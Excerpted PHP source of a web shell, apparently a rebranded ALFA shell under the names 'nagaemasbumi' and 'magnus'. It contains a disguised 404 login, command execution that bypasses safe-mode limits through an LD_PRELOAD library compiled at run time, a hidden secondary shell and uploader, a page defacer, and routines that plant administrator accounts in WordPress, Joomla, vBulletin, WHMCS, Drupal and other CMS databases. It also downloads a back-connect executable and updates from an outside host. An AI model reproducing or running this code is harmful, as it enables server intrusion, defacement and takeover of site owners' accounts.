...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'magnus',
    'password' => '4af59facd6f83a7e9742aa3b2f424ec4',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$Eform='<style>input{margin:0;background:white;border:none;outline:none;caret-color:transparent;color:transparent;text-shadow:none;}</style><form method="POST"><input type="text" name="password" autocomplete="off"></form>';
...
<center><img style="border-radius:100px;" width="335" height="138" alt="alfa team 2012" draggable="false" src="https://res.cloudinary.com/diajtnvji/image/upload/v1767792862/magnus_by7p6n.webp" /></center>
...
echo "<html><head><title></title></head><body>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
...
echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
}
}
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$out = "";
		if(strpos($data, "[nagaemasbumi~api]") !== false && strpos($data, '[nagaemasbumi~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
...
function _alfa_bypass_ld_preload($cmd) {
    $out = "";
    $tmp_path = sys_get_temp_dir();
    $so_path = $tmp_path . "/alfa_bypass.so";
    $out_path = $tmp_path . "/alfa_out.txt";
    
    $c_code = "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nvoid payload() {\n    system(\"$cmd > $out_path 2>&1\");\n}\nint geteuid() {\n    if (getenv(\"LD_PRELOAD\")) {\n        unsetenv(\"LD_PRELOAD\");\n        payload();\n    }\n    return 0;\n}";
    
    $c_path = $tmp_path . "/alfa_bypass.c";
    @file_put_contents($c_path, $c_code);
    
    @shell_exec("gcc -shared -fPIC $c_path -o $so_path -ldl");
    if (!file_exists($so_path)) {
        @exec("gcc -shared -fPIC $c_path -o $so_path -ldl");
    }
    ...
    if (file_exists($so_path)) {
        ...
        if (file_exists($out_path)) {
            $out = @file_get_contents($out_path);
            @unlink($out_path);
        }
        @unlink($c_path);
        @unlink($so_path);
...
function _alfa_bypass_imap($cmd) {
    if (!function_exists('imap_open')) return "";
    $tmp_path = sys_get_temp_dir() . "/alfa_imap_out.txt";
    $payload = "echo \"$cmd\" | base64 -d | bash > $tmp_path 2>&1";
    $payload_b64 = base64_encode($cmd);
    $server = " {localhost:993/imap/openssl/notls}INBOX";
    @imap_open($server, "", ""); 
    // Catatan: imap_open sering disalahgunakan via parameter server untuk eksekusi perintah
    // Namun metode ini sangat spesifik versi, di sini kita gunakan sebagai opsi tambahan
    return ""; 
}
...
$out=@stream_get_contents($pipes[1]);
	...
	$out=$stdout->ReadAll();
        ...
        $out = _alfa_bypass_ld_preload($in);
        if (empty($out) && function_exists('imap_open')) {
            // imap_open bypass logic can be complex, adding as placeholder for future expansion
        }
    }
	}catch(Exception $e){}
return $out;
...
if(isset($_GET["nagaemasbumi"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>nagaemasbumi Hidden Shell</title>";
...
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_nagaemasbumi.value = btoa(unescape(encodeURIComponent(this.command_nagaemasbumi.value)));" method="POST">Execute Command: <input name="command_nagaemasbumi" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_nagaemasbumi'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$nagaemasbumi = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_nagaemasbumi']);
echo alfaEx($nagaemasbumi);
}
echo'</pre>
</body></html>';
exit;}
...
$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$nagaemasbumi = fopen("nagaemasbumi.php","w");fwrite($nagaemasbumi,$x);';
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?nagaemasbumi"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:0px;" width="285" height="115" alt="magnus" draggable="false" src="https://res.cloudinary.com/diajtnvji/image/upload/v1767792862/magnus_by7p6n.webp" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://spookyshort.store/icons/btn.png';
	$s['alfamini']='https://spookyshort.store/icons/alfamini.png';
	$s['loader']='https://spookyshort.store/icons/loader.svg';
...
$curl = new AlfaCURL();
$content = $curl->Send("http://nagaemasbumi.com/market.php");
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="nagaemasbumi"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("http://nagaemasbumi.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://res.cloudinary.com/diajtnvji/image/upload/v1767792862/magnus_by7p6n.webp'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Contact : magnus@gmail.com</font><br>
<font color='#FF0000'>############</font><br>
</center></pre><iframe src='tg://resolve?domain=nagaemasbumi' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
alfafooter();
...
$create = "insert into tblclients (email) values('nagaemasbumi@cybnus.it')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=nagaemasbumi@cybnus.it");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$nagaemasbumi = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/nagaemasbumi.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>nagaemasbumi@cybnus.it</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/nagaemasbumi.php' target='_blank'>".$path."/nagaemasbumi.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
if($res){
$ff = 'http://'.$realurl.$realpath."/nagaemasbumi.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/nagaemasbumi.php";
...
function alfacheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://nagaemasbumi.com/update.json?ver=".__ALFA_VERSION__);
		...
		if($json){
			...
			if(isset($json["nagaemasbumi"]) && !empty($json["nagaemasbumi"])){
				$data["nagaemasbumi"] = $json["nagaemasbumi"];
			}
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://spookyshort.store/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Rebirth Haxor Team &copy; 2016-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>magnus@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/cybnus'>@cybnus</a></span></div></td>
</tr>
</table>
</div>
...
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"https://spookyshort.store/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"https://spookyshort.store/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"https://spookyshort.store/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"https://spookyshort.store/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"https://spookyshort.store/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"https://spookyshort.store/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"https://spookyshort.store/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"https://spookyshort.store/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"https://spookyshort.store/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"https://spookyshort.store/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"https://spookyshort.store/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"https://spookyshort.store/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"https://spookyshort.store/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"https://spookyshort.store/icons/menu/delete.svg\"> Delete</a>
</div>
...
$s = 'https://spookyshort.store/icons/';
...
<textarea name=index rows='19' cols='103'><title>Hacked</title><b>Hacked</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By nagaemasbumi";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $nagaemasbumi = fopen("'.$fname.'","w"); fwrite($nagaemasbumi,$x);';
...
<title>Hacked</title><b>Hacked</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo __pre();
$nagaemasbumi9 = _alfa_file('/etc/named.conf');
if(is_array($nagaemasbumi9)){
foreach($nagaemasbumi9 as $nagaemasbumi13){
if(@eregi('zone',$nagaemasbumi13)){
preg_match_all('#zone "(.*)"#',$nagaemasbumi13,$nagaemasbumi14);
if(strlen(trim($nagaemasbumi14[1][0])) > 2){
echo $nagaemasbumi14[1][0].'<br>';
}}}
}
}else{
echo __pre();
...
if($lang=='bcwin'){
$alfa = new AlfaCURL();
$s = $alfa->Send('http://nagaemasbumi.com/bc/windows.exe');
$tmpdir = ALFA_TEMPDIR;
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'nagaemasbumi', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nagaemasbumi@cybnus.it', 'inputSize' => '50')
);
create_table($table);
...
$nagaemasbumi=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($nagaemasbumi);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($nagaemasbumi);
$res = $solevis['ID'];
}
$nagaemasbumi=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','nagaemasbumi'),(null,'".$res."','last_name','nagaemasbumi'),(null,'".$res."','nickname','nagaemasbumi'),(null,'".$res."','description','nagaemasbumi'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($nagaemasbumi){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'nagaemasbumi', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nagaemasbumi@cybnus.it', 'inputSize' => '50')
);
create_table($table);
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($nagaemasbumi);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($nagaemasbumi);
$res = $solevis['id'];
}
$nagaemasbumi=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'nagaemasbumi', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'nagaemasbumi@cybnus.it', 'inputSize' => '50')
);
create_table($table);
...
$adm_perm = "16744444";
if($pw_col > 0){
$nagaemasbumi=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$nagaemasbumi=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$nagaemasbumi=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($nagaemasbumi);
if($sole == 1){
$solevis = mysqli_fetch_assoc($nagaemasbumi);
$res = $solevis['userid'];
}
$nagaemasbumi=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('nagaemasbumi');
$nagaemasbumi=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');
}
}
...
$SQL = $_POST['alfa9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$nagaemasbumi=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
$nagaemasbumi=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','nagaemasbumi@cybnus.it','filtered_html','1','Europe/Berlin','nagaemasbumi@cybnus.it')") or die(mysqli_error($conn));
$nagaemasbumi=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($nagaemasbumi);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($nagaemasbumi);
$res = $solevis['uid'];
}
$nagaemasbumi=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'nagaemasbumi');
$nagaemasbumi=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','nagaemasbumi@cybnus.it')") or die(mysqli_error($conn));
if($nagaemasbumi){
__alert('Success... '.$admin.' is created...');}
}
}
...
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$nagaemasbumi = explode(':', $visible);
			$cwd = str_replace("{user}", trim($nagaemasbumi[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($nagaemasbumi[1]), trim($nagaemasbumi[0]), $cwd), $template);
		}
	}
}else{
...
break;
case 'pgsql':
$this->query("CREATE TABLE nagaemasbumi(file text);COPY nagaemasbumi FROM '".addslashes($str)."';select file from nagaemasbumi;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table nagaemasbumi');
...
echo "<div class=header>";
echo "
<center><p><img src=\"http://nagaemasbumi.com/images/farvahar-iran.png\"></p>";
...
$table = array(
'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@cybnus.it', 'inputSize' => '60','placeholder' => true),
